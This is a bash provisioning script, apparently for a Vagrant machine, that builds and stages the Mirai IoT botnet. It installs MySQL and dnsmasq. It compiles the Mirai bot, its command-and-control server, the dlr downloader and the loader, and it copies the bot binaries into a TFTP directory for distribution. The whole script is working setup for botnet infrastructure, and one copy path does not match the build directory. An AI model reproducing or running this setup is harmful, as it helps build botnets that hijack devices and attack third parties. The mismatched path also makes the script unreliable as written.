#!/usr/bin/env bash

echo ">>> Installing packages..."
export DEBIAN_FRONTEND=noninteractive
if [ "$[$(date +%s) - $(stat -c %Z /var/cache/apt/pkgcache.bin)]" -ge 600 ]; then
  apt-get update
fi

apt-get update -y
apt-get install -y git
apt-get install -y gcc
apt-get install -y electric-fence
apt-get install -y mysql-server
apt-get install -y mysql-client
apt-get install -y duende
wget https://golang.org/dl/go1.16.3.linux-amd64.tar.gz
tar -C /usr/local -xzf go1.16.3.linux-amd64.tar.gz
mkdir -p /etc/maradns/logger/

echo "export PATH=\$PATH:/usr/local/go/bin" >> ~/.mirairc
echo "export GOPATH=\$HOME/go" >> ~/.mirairc
echo "source ~/.mirairc" >> ~/.bashrc


echo ">>> Reloading mirairc..."
source ~/.mirairc

echo ">>> Configuring sql..."
mysql < /vagrant/configs/setup_sql.sql

echo ">>> Configuring dnsmasq..."
mkdir -p /vagrant/tftp
killall dnsmasq || true
cp /vagrant/configs/dnsmasq.conf /etc/dnsmasq.conf
dnsmasq

echo ">>> Building mirai bot and cnc..."
cd /vagrant/mirai-code/mirai/

echo ">>> Getting go requirements..."
go mod init mirai-go
go get github.com/go-sql-driver/mysql
go get github.com/mattn/go-shellwords

./build.sh release telnet
cp /vagrant/mirai-code/mirai/release/mirai* /vagrant/tftp/

echo ">>> Building dlr..."
cd /vagrant/mirai-code/dlr
./build.sh
cp /vagrant/mirai/dlr/release/* /vagrant/mirai/loader/bins/

echo ">>> Building loader..."
cd /vagrant/mirai-code/loader
./build.sh

echo ">>> Building loader Debug..."
./build.debug.sh

echo ">>> Done"